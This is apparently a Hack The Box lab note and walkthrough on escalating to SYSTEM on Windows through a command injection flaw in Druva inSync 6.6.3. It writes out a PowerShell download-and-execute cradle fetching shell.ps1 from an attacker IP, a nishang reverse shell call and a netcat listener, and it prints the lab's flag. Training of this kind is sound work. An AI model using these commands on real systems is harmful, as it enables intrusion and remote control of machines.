# Vulnerable Services

Some services/applications may allow us to escalate to SYSTEM and other may allow access to sensitive data such as files containing passwords.

**Enumerating Installed Programs**

```cmd-session
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

From the output above Druva inSync 6.6.3 application is vulnerable to a command injection attack via an exposed RPC service.

{% embed url="https://www.exploit-db.com/exploits/49211" %}
Exploit to escalate our privilege
{% endembed %}

**Enumerating Local Ports**

Furthur enumeration to explore port 6064

```cmd-session
C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

**Enumerating Process ID**

Enumerate the process id 3324 from above

```powershell-session
PS C:\htb> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

**Enumerating Running Service**

```powershell-session
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

### Druva inSync Windows Client Local Privilege Escalation Example

**Modifying PowerShell PoC**

modify the `$cmd` variable from the link of the exploit above to our desired command (send us the reverse shell)

{% embed url="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" %}
Use this reverse shell
{% endembed %}



```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')"
```

[modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy)

## Assessment

Work through the steps above to escalate privileges on the target system using the Druva inSync flaw. Submit the contents of the flag in the VulServices folder on the Administrator Desktop.

<details>

<summary>Walkthrough</summary>

Add the following line to the nishang powershell reverse shell script

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 7890
```

![](<../../../.gitbook/assets/image (38).png>)

edit the exploit at tthe cmd variable to&#x20;

```
powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.5:8000/shell.ps1')
```

Move the exploit to the target host (the reverse shell powershell script still on the attack host)

Start a netcat listener (Using rlwrap)\_

```
rlwrap nc -lvnp 7890
```

Execute the exploit, The exploit will try to get the shell.ps1 from our system (make sure to run python server before hand) and then execute the shell.ps1&#x20;

At the listener we will get the shell as SYSTEM user.

<img src="../../../.gitbook/assets/image (115) (1).png" alt="" data-size="original"> Aud1t\_th0se\_th1rd\_paRty\_s3rvices!

</details>
